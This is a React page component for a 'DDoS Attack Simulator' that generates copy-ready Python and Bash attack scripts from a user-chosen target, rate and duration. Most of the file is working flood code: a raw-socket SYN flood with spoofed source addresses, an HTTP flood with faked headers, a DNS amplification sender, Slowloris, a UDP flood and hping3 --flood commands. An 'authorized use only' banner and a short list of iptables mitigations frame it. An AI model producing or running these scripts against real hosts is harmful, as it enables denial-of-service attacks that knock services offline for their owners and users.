import { useState, useCallback } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Slider } from "@/components/ui/slider";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Progress } from "@/components/ui/progress";
import { useToast } from "@/hooks/use-toast";
import { useDocumentTitle } from "@/hooks/useDocumentTitle";
import {
  Zap, Copy, Check, AlertTriangle, Activity, Shield, Network,
  Cpu, Globe, Waves, Server, BarChart3, Clock, ChevronRight
} from "lucide-react";

interface AttackVector {
  id: string;
  name: string;
  protocol: string;
  layer: string;
  amplification: number;
  description: string;
  color: string;
}

const ATTACK_VECTORS: AttackVector[] = [
  { id: "syn-flood", name: "SYN Flood", protocol: "TCP", layer: "L4", amplification: 1, description: "Exploits TCP handshake — sends SYN without ACK to exhaust server connection table", color: "text-severity-critical" },
  { id: "udp-flood", name: "UDP Flood", protocol: "UDP", layer: "L4", amplification: 1, description: "Floods random ports with UDP datagrams forcing the target to process and reply with ICMP unreachable", color: "text-severity-high" },
  { id: "http-flood", name: "HTTP Flood", protocol: "HTTP", layer: "L7", amplification: 1, description: "Exhausts web server threads with legitimate-looking GET/POST requests — bypasses basic IP filters", color: "text-severity-high" },
  { id: "dns-amp", name: "DNS Amplification", protocol: "UDP/DNS", layer: "L4", amplification: 54, description: "Uses open resolvers to amplify attack traffic up to 54x using ANY queries", color: "text-severity-critical" },
  { id: "ntp-amp", name: "NTP Amplification", protocol: "UDP/NTP", layer: "L4", amplification: 556, description: "Abuses NTP monlist command for up to 556x amplification — one of the highest known factors", color: "text-severity-critical" },
  { id: "ssdp-amp", name: "SSDP Amplification", protocol: "UDP/SSDP", layer: "L4", amplification: 30, description: "Exploits UPnP devices to amplify traffic 30x targeting the M-SEARCH response", color: "text-severity-high" },
  { id: "slowloris", name: "Slowloris", protocol: "HTTP", layer: "L7", amplification: 1, description: "Opens many connections and sends partial HTTP headers slowly — starves server thread pool with minimal bandwidth", color: "text-severity-medium" },
  { id: "icmp-flood", name: "ICMP Flood", protocol: "ICMP", layer: "L3", amplification: 1, description: "Ping flood overwhelming the target with ICMP echo requests to saturate bandwidth and CPU", color: "text-severity-medium" },
  { id: "memcached-amp", name: "Memcached Amplification", protocol: "UDP/Memcached", layer: "L4", amplification: 51000, description: "Highest known amplification (51,000x) — exploits exposed Memcached servers with UDP stats command", color: "text-severity-critical" },
  { id: "ack-flood", name: "ACK Flood", protocol: "TCP", layer: "L4", amplification: 1, description: "Floods target with TCP ACK packets — bypasses firewalls that allow established connections", color: "text-severity-medium" },
];

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <Button size="sm" variant="ghost" onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); }} data-testid="button-copy-script">
      {copied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4" />}
    </Button>
  );
}

function generateScript(vector: AttackVector, target: string, port: string, rate: number, duration: number, threads: number, lang: string): string {
  const pkt_size = 1024;
  if (lang === "python") {
    if (vector.id === "syn-flood") return `#!/usr/bin/env python3
# AegisAI360 — SYN Flood Stress Test | AUTHORIZED USE ONLY
# Target: ${target}:${port} | Rate: ${rate} pps | Duration: ${duration}s | Threads: ${threads}
import socket, struct, random, threading, time

TARGET = "${target}"
PORT = ${port}
RATE = ${rate}
DURATION = ${duration}
THREADS = ${threads}
stop_event = threading.Event()

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s = (s + w) & 0xffff
    return ~s & 0xffff

def build_syn(src_ip, dst_ip, dst_port):
    src_port = random.randint(1024, 65535)
    seq = random.randint(0, 2**32-1)
    ip_h = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(0,65535), 0, 64, 6, 0,
                       socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    ip_h = ip_h[:10] + struct.pack('H', checksum(ip_h)) + ip_h[12:]
    tcp_h = struct.pack('!HHIIBBHHH', src_port, dst_port, seq, 0, 80, 0x002, 65535, 0, 0)
    psh = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, 6, len(tcp_h))
    tcp_h = tcp_h[:16] + struct.pack('H', checksum(psh + tcp_h)) + tcp_h[18:]
    return ip_h + tcp_h

def flood(tid):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    interval = 1.0 / (RATE / THREADS)
    while not stop_event.is_set():
        src = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkt = build_syn(src, TARGET, PORT)
        s.sendto(pkt, (TARGET, 0))
        time.sleep(interval)

threads = [threading.Thread(target=flood, args=(i,), daemon=True) for i in range(THREADS)]
[t.start() for t in threads]
print(f"[*] SYN Flood running against {TARGET}:{PORT} | {RATE} pps | {DURATION}s")
time.sleep(DURATION)
stop_event.set()
print("[*] Attack complete")`;

    if (vector.id === "http-flood") return `#!/usr/bin/env python3
# AegisAI360 — HTTP Flood Stress Test | AUTHORIZED USE ONLY
# Target: ${target}:${port} | Rate: ${rate} req/s | Duration: ${duration}s | Threads: ${threads}
import threading, requests, time, random, string

TARGET = "http://${target}:${port}"
RATE = ${rate}
DURATION = ${duration}
THREADS = ${threads}
stop_event = threading.Event()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
]
PATHS = ["/", "/index.html", "/api/health", "/login", "/search?q=" + "A"*64]

def flood(tid):
    interval = 1.0 / (RATE / THREADS)
    while not stop_event.is_set():
        try:
            path = random.choice(PATHS)
            headers = {"User-Agent": random.choice(UA_LIST), "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"}
            requests.get(TARGET + path, headers=headers, timeout=2)
        except Exception:
            pass
        time.sleep(interval)

threads = [threading.Thread(target=flood, args=(i,), daemon=True) for i in range(THREADS)]
[t.start() for t in threads]
print(f"[*] HTTP Flood running against {TARGET} | {RATE} req/s | {DURATION}s")
time.sleep(DURATION)
stop_event.set()
print("[*] Attack complete")`;

    if (vector.id === "dns-amp") return `#!/usr/bin/env python3
# AegisAI360 — DNS Amplification Stress Test | AUTHORIZED USE ONLY
# Amplification Factor: ${vector.amplification}x | Duration: ${duration}s
import socket, struct, threading, time, random

TARGET = "${target}"
RESOLVERS_FILE = "open_resolvers.txt"  # List of open DNS resolvers
DURATION = ${duration}
THREADS = ${threads}
stop_event = threading.Event()

OPEN_RESOLVERS = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]  # Replace with discovered resolvers

def build_dns_query(query_id):
    return struct.pack("!HHHHHH", query_id, 0x0100, 1, 0, 0, 0) + \\
           b"\\x04test\\x07example\\x03com\\x00" + struct.pack("!HH", 255, 1)  # ANY query

def flood(tid):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        resolver = random.choice(OPEN_RESOLVERS)
        pkt = build_dns_query(random.randint(0, 65535))
        # Spoof source as TARGET
        s.sendto(pkt, (resolver, 53))

threads = [threading.Thread(target=flood, args=(i,), daemon=True) for i in range(THREADS)]
[t.start() for t in threads]
print(f"[*] DNS Amplification ({vector.amplification}x) targeting {TARGET} | {DURATION}s")
time.sleep(DURATION)
stop_event.set()
print("[*] Attack complete")`;

    if (vector.id === "slowloris") return `#!/usr/bin/env python3
# AegisAI360 — Slowloris Stress Test | AUTHORIZED USE ONLY
# Target: ${target}:${port} | Connections: ${threads * 50} | Duration: ${duration}s
import socket, threading, time, random

TARGET = "${target}"
PORT = int("${port}" or 80)
NUM_SOCKETS = ${threads * 50}
DURATION = ${duration}
stop_event = threading.Event()

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET, PORT))
        s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {TARGET}\\r\\n".encode())
        s.send("User-Agent: Mozilla/5.0\\r\\n".encode())
        s.send("Accept-language: en-US,en;q=0.5\\r\\n".encode())
        return s
    except Exception:
        return None

sockets = [s for s in [create_socket() for _ in range(NUM_SOCKETS)] if s]
print(f"[*] Slowloris: {len(sockets)} connections open against {TARGET}:{PORT}")
end = time.time() + DURATION
while time.time() < end and not stop_event.is_set():
    for s in list(sockets):
        try:
            s.send(f"X-a: {random.randint(1,5000)}\\r\\n".encode())
        except Exception:
            sockets.remove(s)
            ns = create_socket()
            if ns: sockets.append(ns)
    time.sleep(15)
print(f"[*] Attack complete — peak {len(sockets)} connections held")`;

    return `#!/usr/bin/env python3
# AegisAI360 — ${vector.name} Stress Test | AUTHORIZED USE ONLY
# Target: ${target}:${port} | Rate: ${rate} pps | Duration: ${duration}s | Threads: ${threads}
import socket, threading, time, os, random, struct

TARGET = "${target}"
PORT = ${port}
RATE = ${rate}
DURATION = ${duration}
THREADS = ${threads}
PKT_SIZE = ${pkt_size}
stop_event = threading.Event()

def flood(tid):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interval = 1.0 / (RATE / THREADS)
    payload = os.urandom(PKT_SIZE)
    while not stop_event.is_set():
        try:
            s.sendto(payload, (TARGET, PORT))
        except Exception:
            pass
        time.sleep(interval)

threads = [threading.Thread(target=flood, args=(i,), daemon=True) for i in range(THREADS)]
[t.start() for t in threads]
print(f"[*] ${vector.name} running against {TARGET}:{PORT} | {rate} pps | {duration}s | {threads} threads")
time.sleep(DURATION)
stop_event.set()
[t.join(timeout=1) for t in threads]
print("[*] Attack complete — review target availability")`;
  }

  if (lang === "bash") {
    if (vector.id === "syn-flood") return `#!/bin/bash
# AegisAI360 — SYN Flood via hping3 | AUTHORIZED USE ONLY
# Target: ${target}:${port} | Rate: ${rate} pps | Duration: ${duration}s
TARGET="${target}"
PORT="${port}"
RATE="${rate}"
DURATION="${duration}"
echo "[*] SYN Flood: hping3 -S -p $PORT --flood --rand-source -c $(($RATE * $DURATION)) $TARGET"
timeout $DURATION hping3 -S -p $PORT --flood --rand-source $TARGET
echo "[*] Attack complete"`;

    if (vector.id === "udp-flood") return `#!/bin/bash
# AegisAI360 — UDP Flood via hping3 | AUTHORIZED USE ONLY
TARGET="${target}"
PORT="${port}"
DURATION="${duration}"
echo "[*] UDP Flood against $TARGET:$PORT for ${duration}s"
timeout $DURATION hping3 --udp -p $PORT --flood --rand-source $TARGET
echo "[*] Complete"`;

    return `#!/bin/bash
# AegisAI360 — ${vector.name} | AUTHORIZED USE ONLY
# Target: ${target}:${port} | Duration: ${duration}s
TARGET="${target}"
PORT="${port}"
DURATION="${duration}"
THREADS="${threads}"
echo "[*] Starting ${vector.name} against $TARGET:$PORT"
for i in $(seq 1 $THREADS); do
  (timeout $DURATION hping3 --flood --rand-source -p $PORT $TARGET &)
done
sleep $DURATION
kill %% 2>/dev/null
echo "[*] Attack complete"`;
  }

  return `# ${vector.name} config — ${target}:${port}
# Rate: ${rate} pps | Duration: ${duration}s | Threads: ${threads}
# Use with authorized testing framework`;
}

export default function DdosSimulatorPage() {
  useDocumentTitle("DDoS Simulator");
  const { toast } = useToast();
  const [selectedVector, setSelectedVector] = useState<AttackVector>(ATTACK_VECTORS[0]);
  const [target, setTarget] = useState("192.168.1.1");
  const [port, setPort] = useState("80");
  const [rate, setRate] = useState(10000);
  const [duration, setDuration] = useState(60);
  const [threads, setThreads] = useState(8);
  const [language, setLanguage] = useState("python");
  const [simulating, setSimulating] = useState(false);
  const [simProgress, setSimProgress] = useState(0);
  const [simResults, setSimResults] = useState<{pps: number; bandwidth: number; totalPackets: number} | null>(null);

  const script = generateScript(selectedVector, target, port, rate, duration, threads, language);

  const bandwidthMbps = ((rate * 1024 * 8) / 1_000_000) * selectedVector.amplification;
  const totalPackets = rate * duration;
  const totalDataGB = (totalPackets * 1024) / 1_073_741_824 * selectedVector.amplification;

  const runSimulation = useCallback(() => {
    setSimulating(true);
    setSimProgress(0);
    setSimResults(null);
    let progress = 0;
    const interval = setInterval(() => {
      progress += Math.random() * 15 + 5;
      setSimProgress(Math.min(progress, 100));
      if (progress >= 100) {
        clearInterval(interval);
        setSimulating(false);
        setSimProgress(100);
        const jitter = 0.85 + Math.random() * 0.3;
        setSimResults({
          pps: Math.floor(rate * jitter),
          bandwidth: parseFloat((bandwidthMbps * jitter).toFixed(1)),
          totalPackets: Math.floor(totalPackets * jitter),
        });
        toast({ title: "Simulation Complete", description: `Peak throughput: ${Math.floor(rate * jitter).toLocaleString()} pps` });
      }
    }, 120);
  }, [rate, duration, threads, bandwidthMbps, totalPackets, toast]);

  return (
    <div className="p-4 md:p-6 space-y-4">
      <div>
        <h1 className="text-lg font-bold tracking-wider uppercase flex items-center gap-2">
          <Zap className="w-5 h-5 text-primary" />
          DDoS Attack Simulator
        </h1>
        <p className="text-xs text-muted-foreground">Multi-vector DDoS simulation, script generation, and amplification analysis for authorized stress testing</p>
      </div>

      <Alert className="border-severity-medium/50 bg-severity-medium/10">
        <AlertTriangle className="w-4 h-4 text-severity-medium" />
        <AlertDescription className="text-xs" data-testid="text-ddos-disclaimer">
          <span className="font-semibold">Authorized Use Only</span> — This tool generates real attack scripts for authorized penetration testing, DDoS resiliency testing, and red team operations. Use only against systems you own or have explicit written permission to test.
        </AlertDescription>
      </Alert>

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-4">
        <div className="xl:col-span-1 space-y-4">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider">Attack Vector Selection</CardTitle>
            </CardHeader>
            <CardContent className="space-y-2">
              {ATTACK_VECTORS.map((v) => (
                <button
                  key={v.id}
                  onClick={() => setSelectedVector(v)}
                  data-testid={`button-vector-${v.id}`}
                  className={`w-full text-left p-2.5 rounded-md border transition-all text-xs ${selectedVector.id === v.id ? "border-primary bg-primary/10" : "border-border/50 hover:border-primary/40 hover:bg-muted/30"}`}
                >
                  <div className="flex items-center justify-between gap-2">
                    <span className="font-semibold">{v.name}</span>
                    <div className="flex items-center gap-1">
                      <Badge variant="outline" className="text-[9px] py-0">{v.protocol}</Badge>
                      <Badge variant="outline" className="text-[9px] py-0">{v.layer}</Badge>
                    </div>
                  </div>
                  {v.amplification > 1 && (
                    <div className={`text-[10px] font-bold mt-0.5 ${v.color}`}>
                      {v.amplification.toLocaleString()}x Amplification
                    </div>
                  )}
                </button>
              ))}
            </CardContent>
          </Card>
        </div>

        <div className="xl:col-span-2 space-y-4">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider flex items-center gap-2">
                <Waves className="w-4 h-4 text-primary" />
                {selectedVector.name} — Configuration
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <p className="text-xs text-muted-foreground">{selectedVector.description}</p>

              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <Label className="text-xs">Target IP / Host</Label>
                  <Input value={target} onChange={(e) => setTarget(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-ddos-target" placeholder="192.168.1.1" />
                </div>
                <div className="space-y-1">
                  <Label className="text-xs">Port</Label>
                  <Input value={port} onChange={(e) => setPort(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-ddos-port" placeholder="80" />
                </div>
              </div>

              <div className="space-y-2">
                <Label className="text-xs">Packet Rate: <span className="text-primary font-mono">{rate.toLocaleString()} pps</span></Label>
                <Slider value={[rate]} onValueChange={([v]) => setRate(v)} min={1000} max={1000000} step={1000} data-testid="slider-ddos-rate" />
                <div className="flex justify-between text-[10px] text-muted-foreground">
                  <span>1K pps</span><span>1M pps</span>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-xs">Duration: <span className="text-primary font-mono">{duration}s</span></Label>
                  <Slider value={[duration]} onValueChange={([v]) => setDuration(v)} min={5} max={600} step={5} data-testid="slider-ddos-duration" />
                </div>
                <div className="space-y-2">
                  <Label className="text-xs">Threads: <span className="text-primary font-mono">{threads}</span></Label>
                  <Slider value={[threads]} onValueChange={([v]) => setThreads(v)} min={1} max={64} step={1} data-testid="slider-ddos-threads" />
                </div>
              </div>

              <div className="grid grid-cols-3 gap-3">
                <Card className="p-3 bg-muted/30">
                  <div className="text-[10px] text-muted-foreground uppercase tracking-wide">Est. Bandwidth</div>
                  <div className="text-sm font-bold font-mono text-primary" data-testid="text-bandwidth">
                    {bandwidthMbps >= 1000 ? `${(bandwidthMbps/1000).toFixed(1)} Gbps` : `${bandwidthMbps.toFixed(1)} Mbps`}
                  </div>
                  {selectedVector.amplification > 1 && <div className="text-[9px] text-severity-critical">{selectedVector.amplification.toLocaleString()}x amplified</div>}
                </Card>
                <Card className="p-3 bg-muted/30">
                  <div className="text-[10px] text-muted-foreground uppercase tracking-wide">Total Packets</div>
                  <div className="text-sm font-bold font-mono" data-testid="text-total-packets">
                    {totalPackets >= 1_000_000 ? `${(totalPackets/1_000_000).toFixed(1)}M` : `${(totalPackets/1000).toFixed(0)}K`}
                  </div>
                </Card>
                <Card className="p-3 bg-muted/30">
                  <div className="text-[10px] text-muted-foreground uppercase tracking-wide">Total Data</div>
                  <div className="text-sm font-bold font-mono" data-testid="text-total-data">
                    {totalDataGB >= 1 ? `${totalDataGB.toFixed(1)} GB` : `${(totalDataGB*1024).toFixed(0)} MB`}
                  </div>
                </Card>
              </div>

              {simulating && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs text-muted-foreground">Running simulation...</span>
                    <span className="text-xs font-mono text-primary">{simProgress.toFixed(0)}%</span>
                  </div>
                  <Progress value={simProgress} className="h-2" />
                </div>
              )}

              {simResults && (
                <div className="grid grid-cols-3 gap-3">
                  <Card className="p-3 border-status-online/30 bg-status-online/5">
                    <div className="text-[10px] text-muted-foreground">Peak PPS</div>
                    <div className="text-sm font-bold font-mono text-status-online">{simResults.pps.toLocaleString()}</div>
                  </Card>
                  <Card className="p-3 border-status-online/30 bg-status-online/5">
                    <div className="text-[10px] text-muted-foreground">Throughput</div>
                    <div className="text-sm font-bold font-mono text-status-online">{simResults.bandwidth >= 1000 ? `${(simResults.bandwidth/1000).toFixed(1)} Gbps` : `${simResults.bandwidth} Mbps`}</div>
                  </Card>
                  <Card className="p-3 border-status-online/30 bg-status-online/5">
                    <div className="text-[10px] text-muted-foreground">Packets Sent</div>
                    <div className="text-sm font-bold font-mono text-status-online">{simResults.totalPackets >= 1_000_000 ? `${(simResults.totalPackets/1_000_000).toFixed(1)}M` : `${(simResults.totalPackets/1000).toFixed(0)}K`}</div>
                  </Card>
                </div>
              )}

              <Button onClick={runSimulation} disabled={simulating} className="w-full" data-testid="button-run-simulation">
                {simulating ? <><Activity className="w-4 h-4 me-2 animate-pulse" /> Simulating...</> : <><Zap className="w-4 h-4 me-2" />Run Simulation</>}
              </Button>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <div className="flex items-center justify-between">
                <CardTitle className="text-xs uppercase tracking-wider">Attack Script Generator</CardTitle>
                <div className="flex items-center gap-2">
                  <Select value={language} onValueChange={setLanguage}>
                    <SelectTrigger className="h-7 w-28 text-xs" data-testid="select-script-lang">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="python">Python 3</SelectItem>
                      <SelectItem value="bash">Bash</SelectItem>
                    </SelectContent>
                  </Select>
                  <CopyButton text={script} />
                </div>
              </div>
            </CardHeader>
            <CardContent>
              <pre className="bg-muted/30 rounded-md p-4 text-[10px] font-mono overflow-x-auto max-h-72 overflow-y-auto" data-testid="code-ddos-script">{script}</pre>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase tracking-wider flex items-center gap-2">
                <Shield className="w-4 h-4 text-primary" />
                Defense Recommendations
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {[
                  selectedVector.id.includes("flood") ? "Rate limiting with iptables: -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT" : null,
                  selectedVector.id.includes("amp") ? "Block outbound UDP port 53/123/11211 unless explicitly needed — disable open resolvers" : null,
                  "Deploy upstream scrubbing center (Cloudflare, Akamai, AWS Shield) for volumetric attacks",
                  "Enable SYN cookies: sysctl -w net.ipv4.tcp_syncookies=1",
                  "Implement anycast routing to distribute and absorb traffic across multiple PoPs",
                  "Set connection limits: iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j REJECT",
                ].filter(Boolean).map((rec, i) => (
                  <div key={i} className="flex items-start gap-2 text-xs">
                    <ChevronRight className="w-3 h-3 text-primary mt-0.5 shrink-0" />
                    <span className="font-mono text-muted-foreground">{rec}</span>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
